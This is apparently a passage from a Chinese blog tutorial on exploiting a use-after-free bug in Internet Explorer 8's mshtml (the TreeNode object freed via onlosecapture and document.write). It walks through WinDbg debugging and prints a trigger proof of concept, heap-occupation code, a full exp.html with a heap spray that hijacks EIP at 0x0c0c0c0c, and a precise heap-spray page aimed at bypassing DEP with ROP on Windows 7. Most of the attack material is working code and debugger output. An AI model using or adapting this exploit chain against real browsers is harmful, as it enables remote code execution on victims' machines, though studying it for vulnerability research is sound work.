+<p><img src="https://s2.ax1x.com/2019/11/07/MAyLtS.png" alt=""></p>
+<p>使用kv查看栈回溯，使用ub查看具体触发的代码。 </p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MAyqk8.png" alt=""><br><img src="https://s2.ax1x.com/2019/11/07/MAyvlj.png" alt=""></p>
+<p>我们再次查看HasContainerCapture+0x14的位置，发现他实际调用了一个已经被释放到对象TreeNode，从而造成了释放后重用（UAF）漏洞。</p>
+<p>继续向下看，我们分析此时造成崩溃的EDI参数，!heap -p -a edi查看edi所在堆的状态。</p>
+<p>可以看到EDI所指向的堆已经在!CTreeNode::Release被释放了。</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MAyx6s.png" alt=""><br><img src="https://s2.ax1x.com/2019/11/07/MAyzXn.png" alt=""><br><img src="https://s2.ax1x.com/2019/11/07/MA6pmq.png" alt=""></p>
+<p>重新调试一遍，查看TreeNode对象（地址和上一次调试不同）在被释放前的空间为0x4c，所以只需要在被释放之后，用js立即分配一块相同大小的堆就能进行占位。 </p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MA6900.png" alt=""></p>
+<p>虽然知道POC触发了UAF漏洞，但是我们对这个漏洞的具体细节还一无所知，更不用提利用了。所以我们要从程序流程的角度来分析一下漏洞触发的原因。</p>
+<p>接下来关闭页堆，进一步调试整个POC的触发的程序流程，以及UAF是如何造成影响的。</p>
+<p>修改一下poc（增加了一段js，创建了一个div对象，具体原因下文会说明），继续调试。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">​	&lt;title&gt;Migraine&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">​	Hello World!</span><br><span class="line">	&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">​		function trigger()</span><br><span class="line">​		&#123;</span><br><span class="line">​			Math.tan(2,1);</span><br><span class="line">​			var father&#x3D;document.createElement(&quot;father&quot;);</span><br><span class="line">​			var child&#x3D;document.createElement(&quot;child&quot;);</span><br><span class="line">​			Math.tan(1,2);</span><br><span class="line">​			document.body.appendChild(father);</span><br><span class="line">​			document.body.appendChild(child);</span><br><span class="line">​			Math.sin(1,2);</span><br><span class="line">​			child.applyElement(father);</span><br><span class="line"></span><br><span class="line">​			father.onlosecapture&#x3D;function() &#123;</span><br><span class="line">​				document.write(&quot;&quot;);</span><br><span class="line">​				Math.cos(1,2);</span><br><span class="line">​				tt &#x3D; new Array(20);</span><br><span class="line">​    			for(i &#x3D; 0; i &lt; tt.length; i++) &#123;</span><br><span class="line">​      			tt[i] &#x3D; document.createElement(&#39;div&#39;);</span><br><span class="line">​      			tt[i].className &#x3D; &quot;\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c&quot;;</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line">​				&#x2F;&#x2F;alert(&quot;123&quot;);</span><br><span class="line">​			&#125;</span><br><span class="line">​			Math.cos(1,2);</span><br><span class="line">​			father[&#39;outerText&#39;]&#x3D;&quot;&quot;;</span><br><span class="line">​			Math.cos(1,2);</span><br><span class="line">​			father.setCapture();</span><br><span class="line">​			child.setCapture();</span><br><span class="line">​		&#125;</span><br><span class="line">​		window.setTimeout(&quot;trigger()&quot;,1000);</span><br><span class="line">​	&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+<p>首先对几个关键部分下断点，在POC中写入一些三角函数，例如tan、sin、cos这几个JS的函数主要是帮助我们判断程序运行到哪个位置，因为在程序汇总我们下断点到函数会反复地运行，可能会多次断下，但是不一定是我们需要到断点。（比如调试时候，tan还没断下来，CElement就断了好几次，这个断点就需要我们跳过）</p>
+<p>下面是我下的断点，仅供参考。（到后期调试最后两个断点可以去掉）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0:016&gt; bl</span><br><span class="line"> 0 e 6d86d898     0001 (0001)  0:**** jscript!tan</span><br><span class="line"> 2 e 6d86d6e9     0001 (0001)  0:**** jscript!sin</span><br><span class="line"> 3 e 6d86d657     0001 (0001)  0:**** jscript!cos</span><br><span class="line"> 4 e 6ba49fd3     0001 (0001)  0:**** mshtml!CElement::CElement</span><br><span class="line"> 5 e 6b9caed1     0001 (0001)  0:**** mshtml!CMarkup::InsertElementInternal</span><br><span class="line"> 6 e 6b9e5acf     0001 (0001)  0:**** mshtml!CElement::appendChild</span><br></pre></td></tr></table></figure>
+
+
+<p>首先断点在了tan，三角函数断点并不是必须的，但是在调试IE这样程序流复杂的对象时，可以帮助我们判断程序运行的位置。</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MA6C7V.png" alt=""> </p>
+<p>第一个CElement::CElement断点，当然直接给createElement下断点也是可以的，但是要获取这个对象的指针，需要运行CElement+0x18的位置。此时EDI存放的便是Element对象的指针。</p>
+<p>即var father=document.createElement(“father”);中的father</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MA6Ep4.png" alt=""> </p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MA6ikT.png" alt=""> </p>
+<p>为什么我们能判断此时的EDI是Element的对象指针呢，其实分析0x6ba49feb地址的这句语句，将C++的虚函数表地址放入了[EDI]的位置，这不就是C++ 初始化对象的行为嘛。对象的头部就是虚函数表。</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MA6FtU.png" alt=""> </p>
+<p>第二个断点，也是同理，var child=document.createElement(“child”);中的child对象指针为2eebd88.</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MA6khF.png" alt=""> </p>
+<p>中途再次断在tan，g继续运行</p>
+<p>创建子结点father</p>
+<p>document.body.appendChild(father);</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MA6V1J.png" alt=""></p>
+<p>创建了一个TreeNode对象，指针默认通过EAX值返回。</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MA6Zc9.png" alt=""> </p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MA6eXR.png" alt=""> </p>
+<p>同理第二个子结点，也可以获取它的指针（child）</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MA6nn1.png" alt=""></p>
+<p>运行结束之后，可以看一下目前的内存结构，发现已经形成了一个类似链表的结构。</p>
+<p>查看内存空间，下图中从上到下分别是</p>
+<p>Element对象father</p>
+<p>子节点<father></p>
+<p>Element对象child</p>
+<p>Element对象child</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MA61hD.png" alt=""></p>
+<p>结构图为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Element对象father(2eec048)    Element对象child(2eebd88)</span><br><span class="line">​      |                                  |</span><br><span class="line">​      V                                  V</span><br><span class="line">子节点&lt;father&gt;(2ee8ac0)         子节点&lt;child&gt;(2ee8388)</span><br><span class="line">       ^                                 ^</span><br><span class="line">       |                                  |</span><br><span class="line">       ------------------------------------</span><br><span class="line">                         |</span><br><span class="line">​             CBody_TreeNode(02f123a8)</span><br></pre></td></tr></table></figure>
+
+<p>而TreeNode则为我们这次释放后重用漏洞的利用对象，通过链表关系我们其实可以知道，调试过程中只需要获取fahter对象的指针，就能通过链表关系获取到TreeNode指针，下一次调试就会节省很多时间。</p>
+<p>接下来程序断点在了sin函数，继续g运行，child.applyElement(father)，直到运行到cos函数。</p>
+<p>此时查看内存，能发现<child>变成了<father>的子结点。</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MA689e.png" alt=""> </p>
+<p>结构图为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Element对象father(2eec048)    Element对象child(2eebd88)</span><br><span class="line">​      |                                  |</span><br><span class="line">​      V                                 V</span><br><span class="line">子节点&lt;father&gt;(2ee8ac0)   &lt;--    子节点&lt;child&gt;(2ee8388)</span><br><span class="line">					^                                 </span><br><span class="line">					|                                  </span><br><span class="line">					\-------------</span><br><span class="line">												|</span><br><span class="line">​             CBody_TreeNode(02f123a8)</span><br></pre></td></tr></table></figure>
+
+
+<p>之后执行father[‘outerText’]=””会发现father以及他的子节点都被清空了。TreeNode也不在Dom树上了，但是这块内存指针依然存在。</p>
+<p>使用!heap -p -a 02f123a8,发现这块内存依旧busy，size为4c</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; !heap -p -a 02f123a8</span><br><span class="line">​    address 02f123a8 found in</span><br><span class="line">​    _HEAP @ 200000</span><br><span class="line">​      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state</span><br><span class="line">​        02f12390 000d 0000  [00]   02f123a8    0004c - (busy)</span><br></pre></td></tr></table></figure>
+
+
+<p>执行father.setCapture();child.setCapture();会触发father.onlosecapture函数</p>
+<p>进而执行的document.write(“”)会将TreeNode释放</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">!heap -p -a 02f123a8,发现内存已经被free了</span><br><span class="line">0:005&gt; !heap -p -a 02f123a8</span><br><span class="line">​    address 05118558 found in</span><br><span class="line">​    _HEAP @ 200000</span><br><span class="line">​      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state</span><br><span class="line">​        02f12390 000d 0000  [00]   02f12398    00060 - (free)</span><br></pre></td></tr></table></figure>
+
+
+
+
+<p>这里就需要划重点了，这个内存被释放了，而之后这个内存的指针依然存在，甚至还被程序调用了。这明显是一个UAF漏洞，这时我们要利用之前讲的占坑技术，申请一段和之前差不多大小的内存，就能成功控制这块内存。</p>
+<p>于是此时我们可以使用Js申请多个与被释放对象相同大小的内存块，对其进行占位。（申请多个是为了保证Exp稳定性）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tt &#x3D; new Array(20);</span><br><span class="line">for(i &#x3D; 0; i &lt; tt.length; i++) &#123;</span><br><span class="line">​     tt[i] &#x3D; document.createElement(&#39;div&#39;);</span><br><span class="line">​     tt[i].className &#x3D; &quot;\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c\u0c0c&quot;;</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>使用javascript申请大量80字节左右的空间（78个0x0c+2个<div>）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tt[i].className &#x3D; &quot;\u1111\u2222\u3333\u4444\u1111\u2222\u3333\u4444\u1111\u2222\u3333\u4444\u1111\u2222\u3333\u4444\u1111\u2222\u3333\u4444\u1111\u2222\u3333\u4444\u1111\u2222\u3333\u4444\u1111\u2222\u3333\u4444\u1111\u2222\u2222\u3333\u4444\u1111&quot;;&#x2F;&#x2F;替代\0c</span><br></pre></td></tr></table></figure>
+<p>查看TreeNode内存空间，发现占位成功。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; !heap -p -a 02f123a8</span><br><span class="line">​    address 02f123a8 found in</span><br><span class="line">​    _HEAP @ 220000</span><br><span class="line">​      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state</span><br><span class="line">​        02f12390 000d 0000  [00]   02f123a8    0004e - (busy)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; dc 02f123a8</span><br><span class="line">02f123a8  22221111 44443333 22221111 44443333  ..&quot;&quot;33DD..&quot;&quot;33DD</span><br><span class="line">02f123b8  22221111 44443333 22221111 44443333  ..&quot;&quot;33DD..&quot;&quot;33DD</span><br><span class="line">02f123c8  22221111 44443333 22221111 44443333  ..&quot;&quot;33DD..&quot;&quot;33DD</span><br><span class="line">02f123d8  22221111 44443333 22221111 44443333  ..&quot;&quot;33DD..&quot;&quot;33DD</span><br></pre></td></tr></table></figure>
+<p>注意：建议覆写部分不要使用0c0c0c0c作为数据，因为后期使用精确堆喷射的时候，我们会修改0c0c0c0c地址的值，这样覆盖虚表地址为0c0c0c0c，而0c0c0c0c地址存放的并不是0c0c0c0c而是我们shellcode的开头。</p>
+<p>继续运行，程序断在了GetInterface+0xac的位置，eax已经被赋值为了0x0c0c0c0c，说明这里调用了我们被释放的对象TreeNode。也就是我们占位成功，并且赋值给EAX。</p>
+<p>不过这里还不是我们控制EIP的漏洞代码，因为这里[eax]不存在值所以程序就断下来了(EAX此时指向的应该是TreeNode虚函数表指针)。</p>
+<p>接下来我们使用堆喷射将这段内存填充满值（0c0c0c0c）。</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MA6G1H.png" alt=""> </p>
+<p>我们增加一个HeapSpray函数，准备好堆喷射，具体堆喷射细节可以参考前辈给出的利用总结（下图）。此时再次运行我们的程序。</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MA6Jcd.png" alt=""> </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">exp.html</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">​	&lt;title&gt;Migraine&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">​	Hello World!</span><br><span class="line">	&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">​		function trigger()</span><br><span class="line">​		&#123;</span><br><span class="line">​			Math.tan(2,1);</span><br><span class="line">​			var father&#x3D;document.createElement(&quot;father&quot;);</span><br><span class="line">​			var child&#x3D;document.createElement(&quot;child&quot;);</span><br><span class="line">​			Math.tan(1,2);</span><br><span class="line">​			document.body.appendChild(father);</span><br><span class="line">​			document.body.appendChild(child);</span><br><span class="line">​			Math.sin(1,2);</span><br><span class="line">​			child.applyElement(father);</span><br><span class="line"></span><br><span class="line">​			father.onlosecapture&#x3D;function() &#123;</span><br><span class="line">​				Heapspray();</span><br><span class="line">​				document.write(&quot;&quot;);</span><br><span class="line">​				&#x2F;&#x2F;Math.cos(1,2);</span><br><span class="line">​				tt &#x3D; new Array(20);</span><br><span class="line">​    			for(i &#x3D; 0; i &lt; tt.length; i++) &#123;</span><br><span class="line">​      			tt[i] &#x3D; document.createElement(&#39;div&#39;);</span><br><span class="line">​      			tt[i].className &#x3D; &quot;\u1111\u2222\u3333\u4444\u1111\u2222\u3333\u4444\u1111\u2222\u3333\u4444\u1111\u2222\u3333\u4444\u1111\u2222\u3333\u4444\u1111\u2222\u3333\u4444\u1111\u2222\u3333\u4444\u1111\u2222\u3333\u4444\u1111\u2222\u2222\u3333\u4444\u1111&quot;;&#x2F;&#x2F;替代\0c</span><br><span class="line">​    			&#125;</span><br><span class="line">​    			Math.sin(1,2);</span><br><span class="line">​				&#x2F;&#x2F;alert(&quot;123&quot;);</span><br><span class="line">​			&#125;</span><br><span class="line"></span><br><span class="line">​			Math.cos(1,2);</span><br><span class="line">​			father[&#39;outerText&#39;]&#x3D;&quot;&quot;;</span><br><span class="line">​			Math.cos(1,2);</span><br><span class="line">​			father.setCapture();</span><br><span class="line">​			child.setCapture();</span><br><span class="line"></span><br><span class="line">​			function Heapspray()</span><br><span class="line">​			&#123;</span><br><span class="line">​				var i&#x3D;0;</span><br><span class="line">​				shellcode&#x3D;&quot;\u1234\u3456\u7890\u1234\u3456\u7890&quot;;</span><br><span class="line">​				block&#x3D;&quot;\u0c0c\u0c0c&quot;</span><br><span class="line">​				while(block.length&lt;0x100000)</span><br><span class="line">​					block+&#x3D;block;</span><br><span class="line">​				block&#x3D;block.substring(0,0x100000&#x2F;2-32&#x2F;2-4&#x2F;2-2&#x2F;2-shellcode.length);</span><br><span class="line">​				block+&#x3D;shellcode;</span><br><span class="line">​				var memory&#x3D;new Array();</span><br><span class="line">​				for(i&#x3D;0;i&lt;600;i++)</span><br><span class="line">​					memory[i]&#x3D;block.substring(0,block.length);</span><br><span class="line">​			&#125;</span><br><span class="line">​		&#125;</span><br><span class="line">​		window.setTimeout(&quot;trigger()&quot;,1000);</span><br><span class="line">​	&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.ax1x.com/2019/11/07/MA6YjA.png" alt="">)<img src="https://s2.ax1x.com/2019/11/07/MA6NnI.png" alt="img"> </p>
+<p>程序跳转到了0x0c0c0c0c，通过栈回溯，很明显是在GetInterface函数中调用call [ecx]，读取了TreeNode对象中的内容，完成了一次堆EIP的控制。</p>
+<p>注：ECX的值来源</p>
+<p>向前阅读，发现上一次运行的断点就在向上5行(详细情况读者可以看本文的上一小节)，根据上文的分析mov ecx,[eax]此时的EAX的值是从被我们覆盖的TreeNode中读取的（已经被我们覆盖为了0c0c0c0c）。从EAX指向的地址读取字符给ECX，而堆空间中已经被堆满了0c0c0c0c，因此导致ECX也被赋值为了0c0c0c0c地址存放的数据（也是0c0c0c0c）。然后call [ecx]就发生了。</p>
+<p>需要注意的是，在后期利用占位使用的字符尽量不要使用0c0c0c0c，因为这个空间会被我们安排ROP链，会导致[EAX]不能给ECX赋正确的值。（0c0c0c0c）</p>
+<p> <img src="https://s2.ax1x.com/2019/11/07/MA6UBt.png" alt="img"></p>
+<p>通过利用这个UAF漏洞，我们最后成功控制了程序流。</p>
+<p><img src="file:////var/folders/lv/mx34g1z16nl89qtd0_3rqjk00000gn/T/com.kingsoft.wpsoffice.mac/wps-p0kerface/ksohtml/wpssES8oL.jpg" alt="img"> <img src="https://s2.ax1x.com/2019/11/07/MA6wAf.png" alt="img"></p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MA6aHP.png" alt="img"> </p>
+<h3 id="2-1-2-漏洞利用泛谈"><a href="#2-1-2-漏洞利用泛谈" class="headerlink" title="2.1.2 漏洞利用泛谈"></a>2.1.2 漏洞利用泛谈</h3><p>UAF的部分到这里已经结束了。用大佬的说的一句话，就是漏洞和程序编写者有关，与系统无关。UAF漏洞是mshtml的一个内存漏洞，由漏洞能控制程序流。只要没有补丁，IE8在WinXP或者WIN10下，这个漏洞都是存在的。</p>
+<p>区别在于利用难度，WIN XP SP1没有DEP，所以堆喷射一下就解决了。WIN 10开启了很复杂的保护，每周还有更新，利用难度非常高。</p>
+<p>谈这点是的主要目的是什么呢，主要就是想表达自己最近领悟的一个观点。漏洞是客观存在的，与我们在什么系统下执行无关。能够利用，可能就要考验利用者的手法了。所以希望读者能明白，如果希望实现你UAF，那么原理和案例看到这里就够了。</p>
+<p>并不是说利用手法不重要，而是希望自己能够对漏洞概念有一个更深刻的领会。</p>
+<p>下文将尝试在WIN7下的对这个漏洞进行利用，使用ROP和精确堆喷射绕过DEP防护。</p>
+<p>WIN7下的利用分析</p>
+<p>使用mona插件，可以非常明显发现IE开启了DEP（IE本身没有开，但是mshtml开了），导致堆内的空间也不可执行。如果是XP环境，shellcode会被直接执行，但是在这里就需要使用ROP来绕过DEP。ASLR因为需要重启才会导致基础地址发生变化，所以我们本地测试暂时不做讨论。</p>
+<p>绕过DEP的一般操作就是使用VirtualProtect关闭DEP，可以使用x kernel32!Virtual*查找这个函数的位置。如果ASLR的影响算在内，函数地址也不是稳定的。（kernel32的地址也会变化）</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MA60N8.png" alt="img"> </p>
+<p>在正式开始利用前，我们先做一个小实验：</p>
+<p>在HeapSpray执行之后，查看0c0c0c0c的内存空间，发现已经被覆盖。</p>
+<p>使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ed &lt;address&gt; data</span><br></pre></td></tr></table></figure>
+
+<p>我们将0c0c0c0c地址的数据修改成了VirtualProtect的地址。</p>
+<p> <img src="https://s2.ax1x.com/2019/11/07/MARYPf.png" alt=""></p>
+<p>成功跳转进入了函数。</p>
+<p><img src="file:////var/folders/lv/mx34g1z16nl89qtd0_3rqjk00000gn/T/com.kingsoft.wpsoffice.mac/wps-p0kerface/ksohtml/wpslbiK0Y.jpg" alt="img"> </p>
+<h3 id="2-1-3精确堆喷射"><a href="#2-1-3精确堆喷射" class="headerlink" title="2.1.3精确堆喷射"></a>2.1.3精确堆喷射</h3><blockquote>
+<p>目前需要解决的问题有二</p>
+<p>一是我们的数据包括shellcode和ROP链是存放在堆中的，熟悉ROP的读者应该明白只有在栈中（或者伪造的栈）才能正常执行程序链。</p>
+<p>二是程序开启了DEP，堆不可执行，除非ROP链的头部正好对准0c0c0c0c（或者我们制定的其他跳转地址），才能正常执行ROP，一个字节也不能差。但是堆喷射是一种不稳定的技术，ROP链的地址在堆中位置是不确定。</p>
+</blockquote>
+<p>解决方案：</p>
+<p>因为我们将ROP布置在堆中，不能像栈一样方便直接执行。这里可使用栈翻转技术解决，将ESP指向我们堆中的ROP，就和在栈中没有区别了。前文我们已经尝试了在0c0c0c0c的位置布置了一个指向VirtualProtect函数的指针，并且成功跳转了，目前只需要布置好ROP就行。</p>
+<p>那就第二个问题，如何在将ROP链的头精确的放在0c0c0c0c的位置。具体细节可以阅读下面这两篇文章。关键字：精确堆喷射。通过这个技术我们能将ROP精准地对准0c0c0c0c。</p>
+<p><a href="https://blog.csdn.net/huhu1544/article/details/9821735" target="_blank" rel="noopener">链接1</a></p>
+<p><a href="http://www.phreedom.org/research/heap-feng-shui/heap-feng-shui.html" target="_blank" rel="noopener">链接2</a></p>
+<p>HeapSpray.html</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">​	&lt;title&gt;&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">​	var sc&#x3D;&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;;</span><br><span class="line">​	var nop&#x3D;&quot;\u0c0c\u0c0c&quot;;</span><br><span class="line">​	while(nop.length&lt;0x100000)</span><br><span class="line">​		nop+&#x3D;nop;</span><br><span class="line">​	nop&#x3D;nop.substring(0,(0x80000-6)&#x2F;2-sc.length);</span><br><span class="line">​	code&#x3D;sc+nop;</span><br><span class="line">​	heap_chunks&#x3D;new Array();</span><br><span class="line">​	for(i&#x3D;0;i&lt;1000;i++)</span><br><span class="line">​	&#123;</span><br><span class="line">​		heap_chunks[i]&#x3D;code.substring(0,code.length);</span><br><span class="line">​	&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+
+<p>查看0c0c0c0c的内存发现成功覆盖，但是我们需要到是能精准对将ROP链/Shellcode的头部对准0c0c0c0c的位置。</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MARwrj.png" alt="img"> </p>
+<p>查看0c0c0c0c堆块的堆头为0c0a0018。一个堆块对应我们使用JS分配的8MB的heap_chunk。</p>
+<p>而UserPtr也就数据存放的开头为0c0a0030(一般来说是0c010020但是我调试时开了Enable heap tagging)，查看这个区域我们输入数据头部就是从UserPtr+8的位置开始的。</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MARXsH.png" alt="img">)<img src="https://s2.ax1x.com/2019/11/07/MARGIP.png" alt="img"> </p>
+<p>可以看出堆空间的起始地址的最后四位都变成了0018，UserPtr的最后四位则为0030.</p>
+<p>这是在大量分配内存之后会产生的现象。</p>
+<p>虽然每次分配的值地址不一定完全相同，比如第一次0c0c0c0c所在用户堆起始地址为0c0a0030，偏移为0x20bdc，而第二次则为0c0b0030，偏移为0x10bdc。</p>
+<p>但是变化范围都是以0x10000为基数的，只需要在heap_chunk中以0x10000为单位配置好shellcode+nops的格式。最后heap_chunk整体加上偏移地址0xbdc，无论地址怎么变化，都能顺利让0c0c0c0c指向函数shellocode的起始地址。</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MARUxg.png" alt="img"> </p>
+<p>修改HeapSpray,成功利用heap-feng-shui技术将0c0c0c0c的位置精确定为我们shellcode的起始地址。代码如下。</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MARNRS.png" alt="img"> </p>
+<p>可以看到我们内存中每隔0x1000都会存在一个shellcode+nop的结构。这样能让0c0c0c0c具有某种程度上的稳定。</p>
+<p><img src="https://s2.ax1x.com/2019/11/07/MARdMQ.png" alt="img"> </p>
+<p>HeapSpray.html</p>
